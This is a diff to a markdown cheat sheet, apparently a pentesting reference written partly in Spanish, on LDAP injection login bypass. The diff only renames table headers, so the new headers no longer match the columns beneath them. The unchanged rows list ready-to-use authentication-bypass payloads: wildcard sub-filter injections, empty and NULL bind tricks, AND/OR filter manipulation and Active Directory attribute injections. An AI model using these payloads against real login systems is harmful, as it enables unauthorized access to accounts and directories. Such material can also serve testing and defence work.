@@ -22,7 +22,7 @@ linked:
 
 ## Sub-Filter Injection en Login
 
-| **Username payload** | **Password** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `*)(uid=*))(\|(uid=*` | `anything` | Cierra filtro original, agrega `OR` con wildcard match. |
 | `*)(\|(uid=*` | `anything` | Variant más simple. |
@@ -60,7 +60,7 @@ ___
 
 ## Empty / NULL Bind
 
-| **Trick** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Empty username + empty password | `username=&password=` | Some servers permit anonymous bind. |
 | NULL bind | Send `BindRequest` con name="" y password="" | RFC permits anonymous. |
@@ -78,7 +78,7 @@ ___
 
 ## Filter Manipulation Variants
 
-| **Filter type** | **Bypass** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `(&(uid={u})(pass={p}))` | `username=*)(\|(uid=*` + `password=*` | Standard AND filter. |
 | `(\|(uid={u})(mail={u}))` (OR filter) | `username=admin*` (wildcard match) | OR auto-permits. |
@@ -96,7 +96,7 @@ ___
 
 ## Active Directory-Specific Bypass
 
-| **Trick** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `samAccountName` injection | `*)(samAccountName=*` | AD user attribute. |
 | `userPrincipalName` (UPN) | `*)(userPrincipalName=*` | UPN format. |
